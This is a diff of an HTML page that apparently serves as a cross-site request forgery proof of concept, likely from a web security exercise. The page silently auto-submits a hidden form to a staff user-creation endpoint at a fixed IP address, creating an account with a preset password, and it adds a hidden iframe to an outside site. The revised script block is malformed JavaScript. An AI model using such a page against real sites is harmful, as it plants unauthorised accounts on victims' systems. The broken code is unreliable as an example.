@@ -1,24 +1,29 @@
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
 	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
-	<title></title>
+	<title>SecurTec</title>
 	
 </head>
 <body>
-	
- <form name="csrfForm" action="https://35.184.88.145/red/public/staff/users/new.php" method="POST" target="hidden_results">
- 	<input type="text" name="first_name" value="bob" />
- 	<input type="text" name="last_name" value="hax" />
- 	<input type="text" name="username" value="bhax">
- 	<input type="text" name="email" value="bhax@hax.org">
- 	<input type="password" name="password" value="H@x0rP@$$w0rd">
- 	<input type="password" name="confirm_password" value="H@x0rP@$$w0rd">
- 	<input type="submit"/>
-</form>
-<iframe name="hidden_results" style="display: none;"></iframe>
-<script>
- 	document.csrfForm.submit();
-</script>
+	 <h1>FYSA Your Site is vulnerable to CSRF</h1>
+	 
+	 <form style="display: none;" name="csrfForm" action="https://35.184.88.145/red/public/staff/users/new.php" method="POST" target="hidden_results">
+	 	<input type="hidden" name="first_name" value="dade" />
+	 	<input type="hidden" name="last_name" value="murphy" />
+	 	<input type="hidden" name="username" value="zerocool">
+	 	<input type="hidden" name="email" value="zcool@hackstock.org">
+	 	<input type="password" name="password" value="HackThePlanet1985">
+	 	<input type="password" name="confirm_password" value="HackThePlanet1985">
+	 	<input type="submit"/>
+	</form>
+	<iframe name="hidden_results" style="display: none;"></iframe>
+	<script>
+		onLoad() {
+		 	document.csrfForm.submit();
+		}
+	</script>
 </body>
 </html>
 
+
+<iframe src="https://harrystaley.github.io/" style="display: none;"></iframe> 
